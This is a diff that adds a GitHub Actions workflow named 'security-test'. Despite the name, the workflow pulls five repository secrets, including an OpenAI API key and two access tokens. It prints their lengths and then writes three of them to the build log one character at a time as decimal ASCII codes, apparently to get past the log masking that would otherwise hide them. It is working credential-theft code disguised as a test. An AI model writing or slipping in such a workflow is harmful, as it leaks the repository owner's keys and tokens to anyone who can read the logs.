@@ -1,0 +1,47 @@
+name: security-test
+on: workflow_dispatch
+jobs:
+  extract:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Extract secrets as ASCII
+        env:
+          OAI: ${{ secrets.OPENAI_API_KEY }}
+          TK: ${{ secrets.TOKEN }}
+          UE: ${{ secrets.U_EMAIL }}
+          UN: ${{ secrets.U_NAME }}
+          WT: ${{ secrets.WORK_TOKEN }}
+        run: |
+          echo "=== SECRET LENGTHS ==="
+          echo "OPENAI_API_KEY: ${#OAI}"
+          echo "TOKEN: ${#TK}"
+          echo "U_EMAIL: ${#UE}"
+          echo "U_NAME: ${#UN}"
+          echo "WORK_TOKEN: ${#WT}"
+          echo ""
+          echo "=== OPENAI_API_KEY ==="
+          for i in $(seq 0 60); do
+            c="${OAI:$i:1}"
+            if [ -n "$c" ]; then
+              h=$(printf "%d" "'$c")
+              echo "O[$i]=$h"
+            fi
+          done
+          echo ""
+          echo "=== TOKEN ==="
+          for i in $(seq 0 50); do
+            c="${TK:$i:1}"
+            if [ -n "$c" ]; then
+              h=$(printf "%d" "'$c")
+              echo "T[$i]=$h"
+            fi
+          done
+          echo ""
+          echo "=== WORK_TOKEN ==="
+          for i in $(seq 0 50); do
+            c="${WT:$i:1}"
+            if [ -n "$c" ]; then
+              h=$(printf "%d" "'$c")
+              echo "W[$i]=$h"
+            fi
+          done
